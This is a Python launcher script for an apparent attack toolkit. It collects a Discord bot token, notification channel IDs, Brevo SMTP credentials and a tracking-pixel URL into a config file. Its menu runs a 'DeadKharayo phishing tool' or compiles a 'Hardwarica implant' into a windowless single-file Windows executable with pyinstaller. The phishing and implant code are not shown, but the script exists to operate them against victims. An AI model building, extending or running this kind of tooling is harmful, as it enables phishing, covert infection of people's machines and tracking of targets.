# launcher.py
import os
import platform
import subprocess
import time
import json

ASCII_ART = r'''
   ▄█   ▄█▄    ▄█    █▄       ▄████████    ▄████████    ▄████████ ▄██   ▄    ▄██████▄     ▄████████      ████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄      ▄████████  ▄█  ███▄▄▄▄   
  ███ ▄███▀   ███    ███     ███    ███   ███    ███   ███    ███ ███   ██▄ ███    ███   ███    ███      ███   ▀███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███  ███▀▀▀██▄ 
  ███▐██▀     ███    ███     ███    ███   ███    ███   ███    ███ ███▄▄▄███ ███    ███   ███    █▀       ███    ███ ███    ███ ███   ███   ███   ███    ███ ███▌ ███   ███ 
 ▄█████▀     ▄███▄▄▄▄███▄▄   ███    ███  ▄███▄▄▄▄██▀   ███    ███ ▀▀▀▀▀▀███ ███    ███   ███             ███    ███ ███    ███ ███   ███   ███   ███    ███ ███▌ ███   ███ 
▀▀█████▄    ▀▀███▀▀▀▀███▀  ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ ▄██   ███ ███    ███ ▀███████████      ███    ███ ███    ███ ███   ███   ███ ▀███████████ ███▌ ███   ███ 
  ███▐██▄     ███    ███     ███    ███ ▀███████████   ███    ███ ███   ███ ███    ███          ███      ███    ███ ███    ███ ███   ███   ███   ███    ███ ███  ███   ███ 
  ███ ▀███▄   ███    ███     ███    ███   ███    ███   ███    ███ ███   ███ ███    ███    ▄█    ███      ███   ▄███ ███    ███ ███   ███   ███   ███    ███ ███  ███   ███ 
  ███   ▀█▀   ███    █▀      ███    █▀    ███    ███   ███    █▀   ▀█████▀   ▀██████▀   ▄████████▀       ████████▀   ▀██████▀   ▀█   ███   █▀    ███    █▀  █▀    ▀█   █▀  
'''

CONFIG_PATH = "config.json"


def print_banner():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print(ASCII_ART)
    input("\nPress any key to continue...")


def ask_user_config():
    print("\n[!] Please enter the following details:")
    config = {}
    config['discord_token'] = input("[+] Enter Discord Bot Token: ")
    config['guild_id'] = input("[+] Enter Discord Guild ID: ")
    config['channel_id'] = input("[+] Enter Notification Channel ID: ")
    config['smtp_user'] = input("[+] Enter Brevo SMTP Email: ")
    config['smtp_pass'] = input("[+] Enter Brevo SMTP Key: ")
    config['tracking_url'] = input("[+] Enter Tracking Pixel URL: ")

    with open(CONFIG_PATH, 'w') as f:
        json.dump(config, f, indent=4)

    print("\n✅ Config saved to config.json")


def install_requirements():
    choice = input("\nDo you want to install required Python packages now? (yes/no): ").lower()
    if choice.startswith('y'):
        os.system(f"pip install -r requirements.txt")


def compile_implant():
    print("\n[!] Compiling Hardwarica implant into .exe...")
    os.system("pyinstaller --noconfirm --onefile --noconsole Hardwarica.py")
    print("\n✅ Compiled successfully. Check the /dist folder.")


def main():
    print_banner()

    if not os.path.exists(CONFIG_PATH):
        ask_user_config()

    install_requirements()

    print("\n[1] Run DeadKharayo phishing tool")
    print("[2] Compile Hardwarica implant (.exe)")
    print("[3] Exit")
    choice = input("\nChoose an option: ")

    if choice == '1':
        os.system("python3 deadkharayo.py")
    elif choice == '2':
        compile_implant()
    else:
        print("👋 Exiting...")

    open_discord = input("\nDo you want me to open Discord in your browser? (yes/no): ").lower()
    if open_discord.startswith('y'):
        import webbrowser
        webbrowser.open("https://discord.com/channels/@me")


if __name__ == "__main__":
    main()
